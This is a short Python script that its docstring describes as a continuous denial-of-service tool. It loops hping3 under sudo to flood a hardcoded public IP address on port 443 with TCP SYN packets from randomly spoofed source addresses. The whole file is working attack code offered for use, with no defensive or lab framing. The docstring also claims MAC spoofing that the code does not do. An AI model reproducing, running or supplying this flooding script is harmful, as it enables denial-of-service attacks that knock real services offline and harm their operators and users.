'''
Python script for a continuous DOS. It spoofs the IP address to random Ip addresses and MAC address.
'''
import subprocess
import random
import time


def generate_random_ip():
    """
    Generate a random IP address.
    """
    return ".".join(str(random.randint(1, 254)) for _ in range(4))


def run_hping(target_ip, interface, interval=0.001):
    """
    Runs hping3 continuously with random spoofed IPs and ports.

    Parameters:
        target_ip (str): Target IP address.
        interface (str): Network interface for traffic.
        interval (float): Time interval between packets in seconds (default is 1 ms).
    """
    try:
        print(f"Starting continuous hping to {target_ip} with random spoofed packets.")
        while True:
            # Generate random spoofed IP and port
            spoofed_ip = generate_random_ip()

            # Construct the hping3 command
            hping_command = [
                "sudo", "hping3", "-S",  # Send TCP SYN packets
                "-a", spoofed_ip,       # Spoof the source IP address
                "-p", str(target_port), # Set the target port
                "-c", "1000",              # Send 1k packet per command execution
                "--interface", interface,
                target_ip               # Target IP address
            ]

            print(f"Sending packet from spoofed IP: {spoofed_ip} to {target_ip}:{target_port}")

            # Execute the hping3 command
            subprocess.run(hping_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

            # Pause between packets (if needed)
            time.sleep(interval)

    except KeyboardInterrupt:
        print("\nScript interrupted. Exiting...")
    except Exception as e:
        print(f"An error occurred: {e}")


if __name__ == "__main__":
    # Target configuration
    target_ip = "162.241.27.64"  # Replace with your target IP address
    target_port = "443"        # Replace with target port
    interface = "eth0"         # Replace with your network interface (e.g., eth0, wlan0)
    interval = 0.001           # Interval between packets in seconds (default is 1 ms)

    # Run the script
    run_hping(target_ip, interface, interval)
